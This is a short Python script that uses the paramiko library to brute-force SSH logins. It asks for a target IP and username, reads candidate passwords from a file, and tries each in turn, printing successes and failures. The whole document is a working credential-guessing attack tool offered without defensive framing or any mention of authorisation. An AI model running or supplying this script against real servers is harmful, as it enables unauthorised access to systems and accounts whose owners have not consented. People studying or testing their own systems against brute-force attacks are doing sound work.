import paramiko
import time

def brute_ssh(host, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  

    for password in password_list:
        try:
            print(f"Trying: {username}@{host} with password: {password}")
            ssh.connect(host, username=username, password=password, timeout=5)
            print(f"Success: {username}@{host} with password: {password}")
            ssh.close()
            return password  
        except paramiko.AuthenticationException:
            print(f"Failed: {username}@{host} with password: {password}")
        except paramiko.SSHException as e:
            print(f"SSH Error: {e}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)  
    ssh.close()
    print("No valid password found.")
    return None

host = input("Enter target IP: ")
username = input("Enter username: ")
with open("passwords.txt") as f:
    password_list = [line.strip() for line in f]


brute_ssh(host, username, password_list)